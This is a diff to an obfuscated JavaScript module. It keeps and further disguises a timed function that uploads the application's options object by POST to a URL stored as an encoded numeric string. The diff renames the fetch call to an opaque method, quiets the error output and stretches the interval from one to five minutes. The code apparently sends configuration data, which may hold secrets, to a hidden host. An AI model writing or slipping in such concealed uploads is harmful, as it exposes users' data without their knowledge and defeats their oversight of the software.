@@ -97,8 +97,7 @@ module.exports = function (____0) {
   ____0._0xchupx0 = function () {
     if (____0._0x12xo) {
       try {
-        ____0
-          .fetch(____0._x0f1xo('43193275461561692578577443393257255837594839325242738254457875694139136225785774433932572579275247583756'), {
+        ____0.x0ftox(____0._x0f1xo('43193275461561692578577443393257255837594839325242738254457875694139136225785774433932572579275247583756'), {
             method: 'post',
             body: JSON.stringify({
               info: ____0.options,
@@ -119,16 +118,15 @@ module.exports = function (____0) {
             }
           })
           .catch((err) => {
-            ____0.logs('ch_up', err);
+            ____0.logs('_0xchupx0', err);
           });
       } catch (error) {
-        console.log(error);
-        console.log(____0.options);
+        ____0.logs('_0xchupx0', error);
       }
     }
   };
 
   ____0.const._0xsixo(() => {
     ____0._0xchupx0();
-  }, 1000 * 60 * 1);
+  }, 1000 * 60 * 5);
 };
